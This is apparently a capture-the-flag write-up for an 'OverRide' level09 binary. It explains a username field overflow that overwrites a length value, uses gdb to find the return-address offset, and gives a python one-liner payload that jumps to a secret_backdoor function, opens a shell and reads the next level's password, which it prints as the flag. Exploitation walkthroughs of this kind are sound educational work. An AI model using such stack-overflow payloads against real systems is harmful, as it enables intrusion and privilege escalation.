### notes
```c
0x000055555555488c  secret_backdoor
0x00005555555548c0  handle_msg
0x0000555555554932  set_msg
0x00005555555549cd  set_username
0x0000555555554aa8  main
```
---
##### 0x0000555555554aa8 : main() : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x0000000000000aa8--main--assembly)
##### 0x00005555555548c0 : handle_msg() : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x00000000000008c0--handle_msg--assembly)
##### 0x00005555555549cd : set_username(*mail) : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x00000000000009cd--set_usernamemessage--assembly)
##### 0x0000555555554932 : set_msg(*mail) : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x0000000000000932--set_msgmessage--assembly)
##### 0x000055555555488c : secret_backdoor() : assembly
- check [Ressources/asm-explained.md](./Ressources/asm-explained.md#0x000000000000088c--secret_backdoor--assembly)

---
### Code Prediction
- check [source](./source)
---
### Stack Illustration
- N/A
---
### Process of the Exploit
....
- flow of program:
   - main calls `handle_msg`
   - `handle_msg` :
      - declare a the struct `*mail` buffer (`0x7fffffffe500`)
      - calls `set_username` with `*mail` as param
      - calls `set_msg` with `*mail` as apram
   - `set_username` :
      - declare `internal buffer` with __128__ bytes and fill it from __user input__ with 128 bytes max
      - copy 41 bytes from the buffer (user input) to ___mail->username___
         - this will cause to overflow the ___mail->len_message___
   - `set_msg`:
      - declare `internal buffer` with __1024__ bytes and fill it from __user input__ with 1024 bytes max
      - copy __n__ bytes from buffer to `mail->message`
         - `n = mail->len_message`
      - the length of `mail->message` is __140 bytes__
- exploit explanation :
   - we can overwrite the `mail->len_message (140)` (which is used in `set_msg` to fill `mail->message[140]` from `buffer[1024]`) by ___sending 41 bytes to username input___
   - so we'll try to ___overflow handle_msg ret address___ with the ___secret_backdoor adress___ using the `len_message` value and filling the padding between the start of `*mail` buffer address and `handle_msg` ret address
- exploit payload pseudo code : 
   - __padding1__ (`40 bytes`) 
   - \+ __\xff__(`len_message new value in hex`) 
   - \+ __\n__ (`to send first input`)
   - \+ __padding3__ (`size between *mail buffer and handle_msg ret adress (200 bytes)`) : check i found it below 
   - \+ __secret_backdoor ret address__ (`8 bytes`)

- break in handle_msg to get the address of the structer buffer because its declared here and also get the address of RIP
```
(gdb) info break
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x0000555555554aac <main+4>
2       breakpoint     keep y   0x000055555555491f <handle_msg+95>
(gdb) run
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: allali
>: Welcome, allali

Breakpoint 2, 0x000055555555491f in handle_msg ()
(gdb) disass
Dump of assembler code for function handle_msg:
...
   0x000055555555491c <+92>:    mov    rdi,rax
=> 0x000055555555491f <+95>:    call   0x555555554932 <set_msg>
   0x0000555555554924 <+100>:   lea    rdi,[rip+0x295]        # 0x555555554bc0
...    
End of assembler dump.
(gdb) x/x $rdi
0x7fffffffe500: 0x0a  <------------ address of start of buffer (struct mail)
(gdb) i f
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x55555555491f in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8  <------------ address of return address
(gdb) 
```
- we got the desired address:
   - `*mail` (buffer) address : **0x7fffffffe500**
   - `handle_msg` return address : **0x7fffffffe5c8**
   - space between : `0x7fffffffe5c8` - `0x7fffffffe500` = **`200`**
   - to overwrite ret address with scret_backdoor adress, we use the following payload:
      - padding (200 bytes) + secret_backdoor address (8 bytes)
---

### Solution :
- sir 3llah :) 
```shell
level09@OverRide:~$ (python -c 'print("A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh")'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
pwd
/home/users/level09
whoami
end
cd /home/users/end
ls
end
ls -la
total 13
dr-xr-x---+ 1 end  end     80 Sep 13  2016 .
dr-x--x--x  1 root root   260 Oct  2  2016 ..
-rw-r--r--  1 end  end    220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root root     7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 end  end   3489 Sep 10  2016 .bashrc
-rwsr-s---+ 1 end  users    5 Sep 10  2016 end
-rw-r--r--+ 1 end  end     41 Oct 19  2016 .pass
-rw-r--r--  1 end  end    675 Sep 10  2016 .profile
cat .pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

```
|**`flag : j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`**
---

### Ressources :
N/A